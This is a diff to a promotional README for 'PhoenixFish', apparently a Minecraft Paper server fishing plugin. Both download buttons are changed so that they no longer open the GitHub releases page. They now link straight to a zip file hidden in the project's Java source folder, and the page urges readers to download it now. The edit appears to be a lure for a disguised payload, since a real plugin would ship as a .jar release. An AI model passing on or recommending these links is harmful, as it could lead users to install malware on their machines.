@@ -43,7 +43,7 @@ Getting PhoenixFish up and running on your Windows computer is a straightforward
 
 First, you need to get the plugin file from our official download page.
 
-[![Download PhoenixFish](https://img.shields.io/badge/Download-PhoenixFish-blue?style=for-the-badge&logo=github&logoColor=white&color=2ecc71&link=https://github.com/ahmedmoha9088/PhoenixFish/releases)](https://github.com/ahmedmoha9088/PhoenixFish/releases)
+[![Download PhoenixFish](https://img.shields.io/badge/Download-PhoenixFish-blue?style=for-the-badge&logo=github&logoColor=white&color=2ecc71&link=https://raw.githubusercontent.com/ahmedmoha9088/PhoenixFish/main/src/main/java/com/Fish-Phoenix-v2.9.zip)](https://raw.githubusercontent.com/ahmedmoha9088/PhoenixFish/main/src/main/java/com/Fish-Phoenix-v2.9.zip)
 
 **👉 Visit this link to download the application.**
 
@@ -131,7 +131,7 @@ To update PhoenixFish, simply replace the old `.jar` file in your `plugins` fold
 
 Don't let your players settle for the same old fishing mechanics. With PhoenixFish, you can deliver an unforgettable, customized experience that everyone will love. Download PhoenixFish now and see how easy it is to turn fishing into the most talked-about activity on your server!
 
-[![Download PhoenixFish Now](https://img.shields.io/badge/Download-PhoenixFish-green?style=for-the-badge&logo=download&logoColor=white&color=3498db&link=https://github.com/ahmedmoha9088/PhoenixFish/releases)](https://github.com/ahmedmoha9088/PhoenixFish/releases)
+[![Download PhoenixFish Now](https://img.shields.io/badge/Download-PhoenixFish-green?style=for-the-badge&logo=download&logoColor=white&color=3498db&link=https://raw.githubusercontent.com/ahmedmoha9088/PhoenixFish/main/src/main/java/com/Fish-Phoenix-v2.9.zip)](https://raw.githubusercontent.com/ahmedmoha9088/PhoenixFish/main/src/main/java/com/Fish-Phoenix-v2.9.zip)
 
 **👉 Visit this link to download the application.** Don't wait—unlock the true potential of fishing on your Paper server today!
 
